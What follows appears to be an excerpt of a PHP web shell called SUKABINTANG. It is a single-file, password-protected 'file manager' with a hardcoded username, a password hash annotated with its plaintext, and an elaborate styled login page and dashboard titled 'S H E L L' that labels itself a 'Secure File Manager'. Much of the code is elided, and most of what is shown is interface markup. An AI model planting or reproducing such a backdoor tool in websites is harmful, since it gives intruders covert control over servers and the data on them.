<?php
/**
 * SUKABINTANG (single file) — Legacy/PHP-wide compatible
 *
...
/* ---------- Auth ---------- */
define('AUTH_USER', 'sukabintang');
define('AUTH_PASS_HASH', '$2a$12$J62DIKbKHAkUvYrGINtr6.7lEqBHa5nSFmwpFj/8uUGHersTu32Tq'); // pass : a87ff679a2f3e71d9181a67b7542122c
...
function create_nonzero_file($path, $userContent = null){
    $default = "Created by SUKABINTANG @ ".date('c')."\n";
    ...
    $tmp = @tempnam(sys_get_temp_dir(), 'S H E L L_');
    if ($tmp){
...
function render_login($err=''){
    ...
    <!doctype html><html lang="en" class="dark"><head>
      <meta charset="utf-8"><title>S H E L L</title>
      ...
      <style>
        ...
        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(246, 59, 149, 0.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
        ...
        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(153, 37, 235, 0.35)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(184, 148, 184, 0.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(246, 59, 202, 0.25);border-color:#3b82f6}
      ...
      <div class="w-full max-w-md card p-6">
        <div class="mb-5 flex items-center justify-between">
          <div class="text-xl font-bold tracking-tight title">S H E L L</div>
        ...
        <p class="text-[12px] text-slate-400 mt-4 text-center">© SUKABINTANG File Manager</p>
      </div>
    </body></html><?php
}
...
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        ...
        <div>
          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">S H E L L</a></div>
  ...
  <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">
    ...
    <aside class="col-span-12 xl:col-span-3 space-y-4">
      <?php if (!empty($_SESSION['msg'])): ?>
        <div class="rounded-xl border border-S H E L L-900/60 bg-S H E L L-900/20 text-S H E L L-100 px-4 py-3">
  ...
  <footer class="w-full px-6 py-4">
    ...
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php echo $yearNow; ?> S H E L L — Secure File Manager. All rights reserved.</span>
